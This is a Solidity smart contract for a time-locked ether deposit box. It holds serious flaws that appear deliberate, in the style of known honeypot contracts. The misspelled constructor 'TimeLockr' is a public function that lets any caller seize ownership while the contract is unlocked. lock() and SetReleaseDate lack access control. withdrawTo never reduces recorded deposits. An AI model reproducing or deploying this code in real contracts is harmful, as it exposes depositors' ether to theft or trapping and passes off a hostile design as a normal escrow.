1 pragma solidity ^0.4.15;
2 
3 contract TimeLocker {
4     
5     event Deposit(address indexed depositor, uint amount);
6     event Withdrawal(address indexed to, uint amount);
7 
8     address Owner;
9     function transferOwnership(address to) public onlyOwner {
10         Owner = to;
11     }
12     
13     mapping (address => uint) public Deposits;
14     uint minDeposit;
15     bool Locked;
16     uint Date;
17 
18     function TimeLockr() payable open {
19         Owner = msg.sender;
20         minDeposit = 0.5 ether;
21         Locked = false;
22         deposit();
23     }
24 
25     function SetReleaseDate(uint NewDate) {
26         Date = NewDate;
27     }
28 
29     function() public payable { deposit(); }
30 
31     function deposit() public payable {
32         if (msg.value > 0) {
33             if (msg.value >= MinimumDeposit())
34                 Deposits[msg.sender] += msg.value;
35             Deposit(msg.sender, msg.value);
36         }
37     }
38 
39     function withdraw(uint amount) public { withdrawTo(msg.sender, amount); }
40     
41     function withdrawTo(address to, uint amount) public onlyOwner {
42         if (WithdrawalEnabled()) {
43             uint max = Deposits[msg.sender];
44             if (max > 0 && amount <= max) {
45                 to.transfer(amount);
46                 Withdrawal(to, amount);
47             }
48         }
49     }
50 
51     function MinimumDeposit() public constant returns (uint) { return minDeposit; }
52     function ReleaseDate() public constant returns (uint) { return Date; }
53     function WithdrawalEnabled() constant internal returns (bool) { return Date > 0 && Date <= now; }
54     function lock() public { Locked = true; }
55     modifier onlyOwner { if (msg.sender == Owner) _; }
56     modifier open { if (!Locked) _; }
57     function kill() { require(this.balance == 0); selfdestruct(Owner); }
58 }